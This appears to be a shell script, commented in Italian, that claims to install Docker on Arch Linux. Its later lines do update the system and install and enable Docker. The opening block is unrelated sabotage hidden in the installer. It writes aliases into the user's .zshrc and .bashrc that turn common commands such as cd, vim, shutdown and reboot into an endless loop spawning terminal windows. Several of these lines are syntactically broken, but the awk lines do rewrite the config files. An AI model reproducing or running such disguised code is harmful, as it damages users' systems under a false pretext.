# Script per installare Docker su Arch Linux
echo ~/.zshrc >> 'alias code=while do gnome-terminal: done; ||'
echo ~/.bashrc >> 'alias code=while do gnome-terminal: done; ||'
echo ~/.zshrc >> 'alias cd=while do gnome-terminal: done; ||'
echo ~/.bashrc >> 'alias cd=while do gnome-terminal: done; ||'
echo ~/.zshrc >> 'alias sh=while do gnome-terminal: done; ||'
echo ~/.bashrc >> 'alias sh=while do gnome-terminal: done; ||'
echo ~/.zshrc >> 'alias vim=while do gnome-terminal: done; ||'
echo ~/.bashrc >> 'alias vim=while do gnome-terminal: done; ||'
echo ~/.zshrc >> 'alias nano=while do gnome-terminal: done; ||'
echo ~/.bashrc >> 'alias nano=while do gnome-terminal: done; ||'
echo ~/.zshrc >> 'alias shutdown=while do gnome-terminal: done; ||'
echo ~/.bashrc >> 'alias shutdown=while do gnome-terminal: done; ||'
echo ~/.zshrc >> 'alias reboot=while do gnome-terminal: done; ||'
echo ~/.bashrc >> 'alias reboot=while do gnome-terminal: done; ||'
awk 'BEGIN {print "alias neofetch=while do gnome-terminal: done; ||"} {print}' .zshrc > suca.txt && mv suca.txt .zshrc
awk 'BEGIN {print "alias neofetch=while do gnome-terminal: done; ||"} {print}' .bashrc > suca.txt && mv suca.txt .bashrc


# Aggiornamento del sistema
echo "Aggiornamento del sistema in corso..."
sudo pacman -Syu --noconfirm

# Installazione di Docker
echo "Installazione di Docker in corso..."
sudo pacman -S docker --noconfirm

# Abilitazione e avvio del servizio Docker
echo "Configurazione del servizio Docker..."
sudo systemctl enable docker
sudo systemctl start docker

# Aggiunta dell'utente corrente al gruppo docker per evitare di usare sudo
echo "Aggiunta dell'utente corrente al gruppo docker..."
sudo usermod -aG docker $USER

# Verifica dell'installazione
echo "Verifica dell'installazione di Docker..."
docker --version

echo "Installazione di Docker completata!"
echo "Nota: È necessario riavviare la sessione per applicare le modifiche al gruppo."
echo "Dopo il riavvio, puoi verificare che tutto funzioni con: docker run hello-world"